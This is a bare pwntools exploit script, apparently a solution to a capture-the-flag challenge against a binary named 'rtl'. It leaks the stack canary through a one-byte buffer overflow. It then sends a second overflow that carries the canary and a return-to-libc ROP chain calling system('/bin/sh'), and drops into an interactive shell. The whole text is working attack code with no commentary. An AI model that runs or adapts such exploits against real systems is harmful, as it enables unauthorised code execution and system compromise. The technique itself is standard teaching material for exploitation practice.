from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

def start():
    if args.REMOTE:
        host = ""
        port = 0
        return remote(host,port)
    else:
        return process('./rtl')
p=start()

p.recvuntil('Buf: ')
payload = b'a'*(0x39)
p.send(payload)
p.recvuntil(payload)
cnry = b'\x00'+p.recvn(7)
canary = u64(cnry)

ret = 0x400596
pop_rdi = 0x400853
binsh = 0x400874
system = 0x4005d0

payload = b'a'*0x38
payload += p64(canary)
payload += b'b'*0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.recvuntil('Buf: ')
p.send(payload)
p.interactive()
